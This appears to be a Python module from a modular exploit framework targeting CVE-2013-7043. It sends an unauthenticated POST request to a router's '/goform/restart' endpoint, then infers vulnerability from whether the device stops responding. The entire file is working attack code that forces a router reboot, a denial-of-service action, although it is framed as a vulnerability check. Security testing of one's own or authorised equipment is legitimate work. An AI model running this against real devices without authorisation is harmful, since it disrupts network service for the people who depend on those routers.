# CVE-2013-7043
# https://www.exploit-db.com/exploits/29927/

from jframework.modules.model import ModuleSinglePort
from http.client import HTTPConnection
from urllib.parse import urlencode
from time import sleep


class Csrf_restart(ModuleSinglePort):

    def run(self):
        parameters = urlencode({"Restart":""})
        try:
            http = HTTPConnection(host=self.host, port=self.single_port, timeout=2)
            http.request("POST", "/goform/restart", parameters)
            http.close()
            print("Request send. Waiting 15 seconds")
            sleep(15)
            try:
                http = HTTPConnection(host=self.host, port=self.single_port, timeout=2)
                http.request("GET", "/")
                print("No vulnerable to CSRF")
                http.close()
            except:
                print("The router was restart -> Vulnerable to CSRF")
        except:
            print("Connection refused")